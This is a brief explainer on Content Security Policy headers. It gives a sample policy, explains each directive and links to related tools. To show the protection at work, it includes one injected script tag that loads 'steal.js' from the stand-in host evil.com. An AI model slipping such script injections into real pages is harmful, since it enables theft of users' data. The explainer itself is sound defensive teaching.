# WTF is CSP?

CSP (Content Security Policy) is an HTTP header that tells the browser which sources of content (scripts, styles, images, fonts) are allowed to load on your page. If an attacker injects a `<script>` tag pointing to evil.com, the browser blocks it because evil.com isn't in your CSP whitelist. It's one of the strongest defenses against XSS.

```
Header:
  Content-Security-Policy:
    default-src 'self';
    script-src 'self' cdn.example.com;
    style-src 'self' 'unsafe-inline';
    img-src *;

What this means:
  Scripts  → only from your domain + cdn.example.com
  Styles   → your domain + inline styles allowed
  Images   → from anywhere
  Default  → everything else only from your domain

  Attacker injects: <script src="https://evil.com/steal.js">
  Browser: "evil.com not in script-src" → BLOCKED
```

**Examples:** [helmet](https://github.com/helmetjs/helmet), [CSP Evaluator](https://csp-evaluator.withgoogle.com/), [Report URI](https://report-uri.com/)
